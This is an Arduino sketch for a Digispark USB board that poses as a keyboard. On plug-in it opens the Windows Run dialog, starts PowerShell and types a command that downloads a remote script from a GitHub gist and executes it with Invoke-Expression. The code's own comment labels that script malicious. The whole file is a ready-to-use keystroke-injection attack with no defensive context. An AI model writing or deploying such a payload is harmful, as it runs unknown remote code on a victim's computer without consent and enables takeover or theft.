#include "DigiKeyboard.h" /* Digistump drives. */
#include <avr/pgmspace.h> /* Fix memory issues. */

void setup() {
  DigiKeyboard.update();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /* Open execute dialog. */
  delay(50); /* Delay until it opens. */
  DigiKeyboard.println(F("powershell")); /* Open powershell. */
  delay(400); /* You may have to adjust this delay. */
  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/whoismath/a965e49313498b3ab4ef5a020ab573e7/raw/ed8dbca8c0a9fcd976e5f51f03957add427f68f0/change.ps1')"));  /* Download and execute malicius script. */
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0); /* Send the command. */
  for(;;) { /* run just once. */ }
}
